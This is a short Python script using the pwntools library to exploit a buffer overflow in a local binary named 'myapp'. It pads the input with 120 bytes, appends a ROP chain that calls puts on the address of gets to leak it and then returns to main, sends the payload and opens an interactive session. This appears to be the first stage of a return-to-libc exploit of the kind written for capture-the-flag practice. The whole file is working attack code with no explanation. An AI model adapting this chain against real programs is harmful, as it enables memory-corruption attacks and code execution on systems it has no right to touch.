from pwn import *

BUFFER_LEN = 120

e = ELF("./myapp")
p = process(e.path)

# Searching symbols on the binary
puts    = e.symbols[b"puts"]
printf  = e.symbols[b"printf"]
main    = e.symbols[b"main"]
gets    = e.symbols[b"gets"]

# Chain #1
print("[!] ROP Chain #1")
rop = ROP(e)
rop.call(puts, (gets,))
rop.call(main, (0,0,0,))
payload = (b"\x41" * BUFFER_LEN) + rop.chain()

p.sendline(payload)
p.recv()

p.interactive()